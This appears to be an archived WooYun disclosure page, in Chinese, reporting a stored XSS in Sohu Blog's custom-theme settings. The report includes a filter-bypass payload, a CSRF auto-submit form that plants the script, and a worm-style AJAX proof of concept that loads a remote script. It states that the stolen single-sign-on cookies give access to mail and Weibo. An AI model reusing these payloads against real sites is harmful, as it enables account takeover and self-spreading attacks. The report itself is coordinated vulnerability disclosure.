@@ -1,0 +1,267 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		搜狐博客存储型xss1获取cookie可登录邮箱微博等（可蠕动）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		搜狐博客存储型xss1获取cookie可登录邮箱微博等（可蠕动）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/D＆G">D＆G</a> 
+</li><li>提交时间：		2013-12-18 11:41</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-12-18：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-12-18：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-12-28：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-01-07：	细节向普通白帽子公开<br/>
+									2014-01-17：	细节向实习白帽子公开<br/>
+									2014-02-01：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">talk is cheap</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">问题出在自定义主题： </p><p class="detail"><a href="../images/14183402fffef782acc617649d2663f184f4e1d6.png" target="_blank"><img src="../images/14183402fffef782acc617649d2663f184f4e1d6.png" alt="blogxss4.png" width="600"/></a></p><p class="detail"> 选择自定义主题，抓包如下： </p><pre><code>m=update&amp;v=xml&amp;css|#header|bgi=url(&quot;http://js1.pp.sohu.com.cn/ppp/blog/styles_ppp/images/custom/themesHeaderBg/1.jpg&quot;)&amp;css|#header-bak|bgi=&amp;css|#header|bgr=no-repeat&amp;css|#header|bgp=left center&amp;css|#header|h=200px&amp;css|body|bgi=url(&quot;http://js1.pp.sohu.com.cn/ppp/blog/styles_ppp/images/custom/themesBodyBg/6.jpg&quot;)&amp;css|body-bak|bgi=&amp;css|body|bgr=repeat&amp;css|body|bgp=left top</code></pre><p class='detail'> 然后查看网页源代码，发现输出在style标签之间： </p><pre><code>&lt;style type=&quot;text/css&quot; id=&quot;customTheme&quot;&gt; #header{background-repeat: no-repeat;} body{background-image: url(&quot;http://js1.pp.sohu.com.cn/ppp/blog/styles_ppp/images/custom/themesBodyBg/6.jpg&quot;);} #header{height: 200px;} #header{background-position: left center;} body{background-position: left top;} body{background-repeat: repeat;} #header{background-image: url(&quot;http://js1.pp.sohu.com.cn/ppp/blog/styles_ppp/images/custom/themesHeaderBg/1.jpg&quot;);} &lt;/style&gt;</code></pre><p class='detail'> 显然，css|#header|bgi=url(&quot;http://js1.pp.sohu.com.cn/ppp/blog/styles_ppp/images/custom/themesHeaderBg/1.jpg&quot;) 的输出对应#header{background-image: url(&quot;http://js1.pp.sohu.com.cn/ppp/blog/styles_ppp/images/custom/themesHeaderBg/1.jpg&quot;);} 经过测试发现这个参数是可控的。这时候当然是想到利用expression来执行javascript。但是用二哥的话说，expression不好玩。所以尝试闭合style标签。 这个点应该没有重点过滤，轻易就可以插入&lt;/style&gt;标签。当尝试插入&lt;script src=“”&gt;&lt;/script&gt;的时候，发现输出进行了过滤。测试发现是过滤了 </p><pre><code>tag=×××</code></pre><p class='detail'> 一但出现就会过滤掉=之后的内容。 可以采用编码绕过，以及http://zone.wooyun.org/content/9103 长短短大牛提供的牛逼的payload </p><pre><code>&lt;script&gt;&lt;/script&gt;&lt;svg&gt;&lt;script&gt;document.scripts[0].src&amp;#00000000000000000000061/data:,alert(1)/.source&lt;/script&gt;</code></pre><p class='detail'> 后续测试发现这个地方没有防御csrf， </p><pre><code>&lt;html&gt; &lt;body&gt; &lt;form id=&quot;wooyun&quot; name=&quot;wooyun&quot; action=&quot;http://test1alsdk.blog.sohu.com/manage/style.do&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;m&quot; value=&quot;update&quot; /&gt; &lt;input type=&quot;text&quot; name=&quot;css|#header|bgi&quot; value=&#039;url(&quot;http:11224156611&quot;)&gt;*/alert(1)&lt;/script&gt;&#039; /&gt; &lt;input type=&quot;text&quot; name=&quot;css|#header-bak|bgi&quot; value=&quot;&lt;/style&gt;&lt;script&gt;/*&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt; &lt;/form&gt; &lt;script&gt; document.long.submit(); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;</code></pre><p class='detail'> 可以csrf直接插入xss代码。 这个地方可以长期存在，修改主题也不会影响。只有下次重新自定义主题之后，xss代码才会被覆盖。 不过既然有xss了。蠕虫传播起来应该也不困难。csrf只是让事情变的更简单了。 <br />
+<br />
+csrf测试代码：<br />
+<br />
+</p><pre><code>&lt;html&gt;<br />
+<br />
+<br />
+<br />
+&lt;body&gt;<br />
+<br />
+<br />
+<br />
+&lt;form id=&quot;wooyun&quot; name=&quot;wooyun&quot; action=&quot;http://blog.sohu.com/manage/style.do&quot; method=&quot;POST&quot;&gt;<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+&lt;input type=&quot;text&quot; name=&quot;m&quot; value=&quot;update&quot; /&gt;<br />
+<br />
+&lt;input type=&quot;text&quot; name=&quot;css|#header|bgi&quot; value=&#039;url(&quot;http:11224156611&quot;)&gt;*/alert(34433)&lt;/script&gt;&#039; /&gt;<br />
+<br />
+&lt;input type=&quot;text&quot; name=&quot;css|#header-bak|bgi&quot; value=&quot;&lt;/style&gt;&lt;script&gt;/*&quot; /&gt;<br />
+&lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;<br />
+<br />
+<br />
+<br />
+&lt;/form&gt;<br />
+<br />
+<br />
+<br />
+&lt;script&gt;<br />
+<br />
+<br />
+<br />
+   document.long.submit();<br />
+<br />
+<br />
+<br />
+&lt;/script&gt;<br />
+<br />
+<br />
+<br />
+&lt;/body&gt;<br />
+<br />
+<br />
+<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+关于cookie：sohu的cookie是一站式cookie，有效的cookie可以登录博客，微薄，相册，邮箱。也就是说一个xss操作所有这些业务点了。<br />
+<br />
+蠕虫没有测试，定向测试了一下cookie的有效性。<br />
+<br />
+截图如下：<br />
+<br />
+</p><p class="detail"><a href="../images/1811172670d1df5a58c5c2d3ec50aedbbf7c4146.png" target="_blank"><img src="../images/1811172670d1df5a58c5c2d3ec50aedbbf7c4146.png" alt="blogxss13.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/181117428f9a47795c624d44dbd7798993c92a3a.png" target="_blank"><img src="../images/181117428f9a47795c624d44dbd7798993c92a3a.png" alt="blogxss14.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/1811175296fc9452eabfb90b99d7a2934fbfc7db.png" target="_blank"><img src="../images/1811175296fc9452eabfb90b99d7a2934fbfc7db.png" alt="blogxss15.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/18111802a770a4285e863b34088cb2ac9d52024e.png" target="_blank"><img src="../images/18111802a770a4285e863b34088cb2ac9d52024e.png" alt="blogxss16.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/1811182968fe8d711cca44f669ec0047c45b517f.png" target="_blank"><img src="../images/1811182968fe8d711cca44f669ec0047c45b517f.png" alt="blogxss17.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/18111839976023f1ac12fbcf49d7a19e60d7d062.png" target="_blank"><img src="../images/18111839976023f1ac12fbcf49d7a19e60d7d062.png" alt="blogxss18.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+关于蠕虫，这个确实没有测试，只用小号验证了下有效性。修改主题只需要post数据包到:http://blog.sohu.com/manage/style.do即可。<br />
+<br />
+<br />
+<br />
+poc代码：<br />
+<br />
+</p><pre><code>&lt;script&gt;<br />
+var ajaxPost = null<br />
+function postUrl(post_url,postStr) //通过Ajax请求POST到远程<br />
+{<br />
+if(window.XMLHttpRequest){<br />
+ajaxPost = new XMLHttpRequest();<br />
+}else if(window.ActiveXObject)<br />
+{<br />
+ajaxPost = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);<br />
+}else<br />
+{<br />
+return &quot;&quot;<br />
+}<br />
+ajaxPost.open(&quot;POST&quot;,post_url,true)<br />
+ajaxPost.withCredentials = &quot;true&quot;;<br />
+ajaxPost.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;)<br />
+ajaxPost.send(postStr)<br />
+}<br />
+<br />
+postUrl(&quot;http://blog.sohu.com/manage/style.do&quot;,&quot;m=update&amp;css%7C%23header%7Cbgi=url%28%22http%3A11224156611%3Cscript%3E%3C%2Fscript%3E%3Csvg%3E%3Cscript%3Edocument.scripts%5B1%5D.src%26%2300000000000000000000061http%3A%2F%2Ft.cn%2F987654321%3C%2Fscript%3E%22)%0A%3C%2Fscript%3E&quot;)<br />
+&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+这个地方可以隐蔽传播，因为表面看不出变化来。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/1811175296fc9452eabfb90b99d7a2934fbfc7db.png" target="_blank"><img src="../images/1811175296fc9452eabfb90b99d7a2934fbfc7db.png" alt="blogxss15.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/18111802a770a4285e863b34088cb2ac9d52024e.png" target="_blank"><img src="../images/18111802a770a4285e863b34088cb2ac9d52024e.png" alt="blogxss16.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">输入过滤以及输出编码 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/D＆G" title="D＆G">D＆G</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-046327" title="搜狐博客存储型xss1获取cookie可登录邮箱微博等（可蠕动）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-12-18 12:41</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢支持。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="46327";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
